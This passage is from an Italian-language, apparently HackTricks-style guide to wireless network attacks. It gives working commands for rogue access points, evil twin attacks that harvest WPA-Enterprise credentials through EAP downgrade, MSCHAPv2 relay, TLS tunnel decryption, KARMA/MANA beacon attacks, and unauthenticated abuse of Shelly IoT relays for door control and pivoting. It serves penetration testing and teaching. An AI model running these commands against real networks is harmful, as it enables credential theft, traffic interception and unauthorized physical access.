- Le station memorizzano l'ESSID di ogni rete wireless a cui si connettono nella loro Preferred Network List (PNL), insieme ai dettagli di configurazione specifici della rete.
- La PNL viene usata per connettersi automaticamente alle reti conosciute, migliorando l'esperienza dell'utente semplificando il processo di connessione.

### Passive Scanning

- Gli AP trasmettono periodicamente beacon frames, annunciando la loro presenza e le loro caratteristiche, incluso l'ESSID dell'AP salvo che la trasmissione sia disabilitata.
- Durante la Passive Scanning, le station ascoltano i beacon frames. Se l'ESSID di un beacon coincide con un elemento della PNL della station, la station può connettersi automaticamente a quell'AP.
- La conoscenza della PNL di un dispositivo permette potenziali exploit impersonando l'ESSID di una rete conosciuta, inducendo il dispositivo a connettersi a un rogue AP.

### Active Probing

- L'Active Probing comporta che le station inviino probe requests per scoprire gli AP vicini e le loro caratteristiche.
- I directed probe requests mirano a un ESSID specifico, aiutando a rilevare se una particolare rete è nel raggio d'azione, anche se è una hidden network.
- I broadcast probe requests hanno il campo SSID nullo e vengono inviati a tutti gli AP nelle vicinanze, permettendo alla station di verificare la presenza di qualsiasi rete preferita senza rivelare il contenuto della sua PNL.

## AP semplice con redirezione verso Internet

Prima di spiegare come eseguire attacchi più complessi, verrà spiegato **come** semplicemente **creare** un **AP** e **reindirizzare** il suo **traffico** a un'interfaccia connessa a Internet.

Usando `ifconfig -a` controlla che l'interfaccia wlan da usare per creare l'AP e l'interfaccia connessa a Internet siano presenti.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crea il file di configurazione `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Quindi **imposta gli IP** e le **rotte**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
E poi **avvia** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crea un file di configurazione `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Interrompi i processi fastidiosi**, imposta **monitor mode** e **avvia hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Inoltro e Reindirizzamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un evil twin attack sfrutta il modo in cui i client WiFi riconoscono le reti, basandosi principalmente sul nome della rete (ESSID) senza richiedere che la base station (access point) si autentichi verso il client. I punti chiave includono:

- **Difficoltà nella distinzione**: I dispositivi fanno fatica a distinguere tra access point legittimi e rogue quando condividono lo stesso ESSID e tipo di crittografia. Nelle reti reali spesso si usano più access point con lo stesso ESSID per estendere la copertura in modo trasparente.
- **Roaming del client e manipolazione della connessione**: Il protocollo 802.11 permette ai dispositivi di spostarsi tra access point appartenenti alla stessa ESS. Gli attacker possono sfruttare questo inducendo un dispositivo a disconnettersi dalla base station corrente e connettersi a una rogue. Questo può essere ottenuto offrendo un segnale più forte o interrompendo la connessione all'access point legittimo tramite metodi come deauthentication packets o jamming.
- **Sfide nell'esecuzione**: Eseguire con successo un evil twin attack in ambienti con più access point ben distribuiti può essere difficile. Deauthenticating un singolo access point legittimo spesso porta il dispositivo a connettersi a un altro access point legittimo a meno che l'attacker non possa deauthenticate tutti gli access point vicini o posizionare strategicamente il rogue access point.

Puoi creare un Open Evil Twin molto basico (no capabilities to route traffic to Internet) eseguendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Puoi anche creare un Evil Twin usando **eaphammer** (nota che per creare evil twins con eaphammer l'interfaccia **NON DEVE** essere in **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Oppure usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Per favore, nota che di default se un ESSID nella PNL è salvato come protetto WPA, il dispositivo non si connetterà automaticamente a un Open evil Twin. Puoi provare a effettuare un DoS sul real AP e sperare che l'utente si connetta manualmente al tuo Open evil twin, oppure puoi effettuare un DoS sul real AP e usare un WPA Evil Twin per catturare l'handshake (usando questo metodo non potrai permettere alla vittima di connettersi a te poiché non conosci la PSK, ma puoi catturare l'handshake e provare a crackarlo).

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

Puoi creare un **Evil Twin using WPA/2** e se i dispositivi sono configurati per connettersi a quell'SSID con WPA/2, cercheranno di connettersi. Comunque, **per completare il 4-way-handshake** devi anche **conoscere** la **password** che il client userà. Se **non la conosci**, la **connessione non verrà completata**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Per comprendere questi attacchi, consiglio di leggere prima il breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Usare hostapd-wpe**

`hostapd-wpe` ha bisogno di un file di **configurazione** per funzionare. Per **automatizzare** la generazione di queste configurazioni puoi usare [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (scarica il file python all'interno di _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Nel file di configurazione puoi selezionare molte cose diverse come ssid, channel, user files, cret/key, dh parameters, wpa version and auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Uso di EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Per impostazione predefinita, EAPHammer utilizza questi metodi di autenticazione (nota GTC come primo da provare per ottenere plaintext passwords e poi l'uso di metodi di autenticazione più robusti):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Questa è la metodologia predefinita per evitare lunghi tempi di connessione. Tuttavia, puoi anche specificare al server i metodi di autenticazione dalla più debole alla più forte:
```
--negotiate weakest
```
Oppure puoi anche usare:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (password in chiaro)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offrendo gli stessi auth methods nello stesso ordine dell'organizzazione l'attacco sarà molto più difficile da rilevare).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (rumoroso)** or **only create the Evil Attack until someone connects (silenzioso).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### Whitelist e blacklist per ESSID e MAC

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Questo metodo permette a un **attacker di creare un malicious access point (AP) che risponde a tutte le probe requests** dai dispositivi che cercano di connettersi alle reti. Questa tecnica **inganna i dispositivi inducendoli a connettersi all'AP dell'attacker** imitando le reti che i dispositivi stanno cercando. Una volta che un dispositivo invia una richiesta di connessione a questo rogue AP, la connessione si completa, portando il dispositivo a connettersi per errore alla rete dell'attacker.

### MANA

Successivamente, **i dispositivi hanno cominciato a ignorare risposte di rete non attendibili**, riducendo l'efficacia dell'originale karma attack. Tuttavia, è stato introdotto un nuovo metodo, noto come **MANA attack**, da Ian de Villiers e Dominic White. Questo metodo prevede che il rogue AP **catturi le Preferred Network Lists (PNL) dai dispositivi rispondendo alle loro broadcast probe requests** con nomi di rete (SSIDs) precedentemente usati dai dispositivi. Questo attacco sofisticato bypassa le protezioni contro l'originale karma attack sfruttando il modo in cui i dispositivi ricordano e danno priorità alle reti conosciute.

Il MANA attack opera monitorando sia le directed che le broadcast probe requests dai dispositivi. Per le directed requests registra la MAC address del dispositivo e il nome di rete richiesto, aggiungendo queste informazioni a una lista. Quando viene ricevuta una broadcast request, l'AP risponde con informazioni corrispondenti a una qualsiasi delle reti presenti nella lista del dispositivo, inducendo il dispositivo a connettersi al rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Un **Loud MANA attack** è una strategia avanzata usata quando i dispositivi non effettuano directed probing o quando le Preferred Network Lists (PNL) non sono note all'attaccante. Si basa sul principio che **i dispositivi nella stessa area probabilmente condividono alcuni nomi di rete nelle loro PNL**. Invece di rispondere in modo selettivo, questo attacco invia probe responses in broadcast per ogni nome di rete (ESSID) trovato nelle PNL combinate di tutti i dispositivi osservati. Questo approccio ampio aumenta la probabilità che un dispositivo riconosca una rete familiare e tenti di connettersi al rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Quando il **Loud MANA attack** potrebbe non essere sufficiente, il **Known Beacon attack** propone un'altra strategia. Questo metodo **forza bruta il processo di connessione simulando un AP che risponde a qualsiasi nome di rete, scorrendo una lista di potenziali ESSIDs** derivata da una wordlist. Ciò simula la presenza di numerose reti, nella speranza di trovare una corrispondenza con un ESSID nella PNL della vittima, inducendo un tentativo di connessione all'AP falsificato. L'attacco può essere amplificato combinandolo con l'opzione `--loud` per un tentativo più aggressivo di catturare i dispositivi.

Eaphammer ha implementato questo attacco come un MANA attack dove tutti gli ESSIDs in una lista vengono caricati (puoi anche combinare questo con `--loud` per creare un Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

La **Known Beacon Burst attack** comporta la **trasmissione a raffica di beacon frames per ogni ESSID elencata in un file**. Questo crea un ambiente denso di reti false, aumentando notevolmente la probabilità che i dispositivi si colleghino al rogue AP, soprattutto se combinata con una MANA attack. Questa tecnica sfrutta velocità e volume per sopraffare i meccanismi di selezione delle reti dei dispositivi.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** è un protocollo che permette ai dispositivi di collegarsi direttamente tra loro usando il Wi‑Fi senza la necessità di un tradizionale access point wireless. Questa capacità è integrata in vari dispositivi Internet of Things (IoT), come stampanti e televisori, facilitando la comunicazione diretta tra dispositivi. Una caratteristica notevole di Wi‑Fi Direct è che un dispositivo assume il ruolo di access point, noto come group owner, per gestire la connessione.

La sicurezza delle connessioni Wi‑Fi Direct è stabilita tramite **Wi‑Fi Protected Setup (WPS)**, che supporta diversi metodi per l'associazione sicura, tra cui:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Questi metodi, in particolare il PIN entry, sono suscettibili alle stesse vulnerabilità di WPS nelle reti Wi‑Fi tradizionali, rendendoli bersagli per vettori di attacco simili.

### EvilDirect Hijacking

**EvilDirect Hijacking** è un attacco specifico per Wi‑Fi Direct. Rispecchia il concetto di un attacco Evil Twin ma prende di mira le connessioni Wi‑Fi Direct. In questo scenario, un attaccante si finge un group owner legittimo con lo scopo di indurre i dispositivi a connettersi a un'entità malevola. Questo metodo può essere eseguito usando strumenti come `airbase-ng` specificando il canale, l'ESSID e l'indirizzo MAC del dispositivo impersonato:

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

Alcuni relè/controller IoT consumer mantengono l'**open AP** di commissioning attivo anche dopo essersi connessi alla WLAN IoT (es. SSID Shelly Gen4 che iniziano con `Shelly`). Il dispositivo rimane **dual-homed**: un'interfaccia AP con IP di default `192.168.33.1` più un'interfaccia client sulla WLAN interna.

**Flusso di abuso (richiede prossimità Wi‑Fi):**

1. Connettersi all'AP di provisioning, ottenere un lease DHCP e navigare l'**AP-side HTTP API**.
2. Triggerare i relè tramite endpoint non autenticati, es. `http://192.168.33.1/relay/0?turn=on` (implicazioni su porte/cancelli/garage). Endpoint per l'upload del firmware possono aggiungere persistenza.
3. Usarlo come **pivot**: gli script Shelly possono inviare richieste HTTP dall'interfaccia interna verso altri host LAN. Esempio di pivot verso un altro Shelly a `10.0.98.221`:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
Sostituire l'URL con qualsiasi target HTTP interno raggiungibile; la dual‑homing evita lavoro aggiuntivo di routing/NAT.
4. A scala: interrogare vendor SSID su **wigle.net** (es. `Shelly`) per localizzare AP di commissioning da sfruttare on‑site.

Per persistenza, lasciare l'AP di commissioning abilitato.

## References

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Take a look to [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con Facebook e imitazione di WPA nei captive portals)

{{#include ../../banners/hacktricks-training.md}}
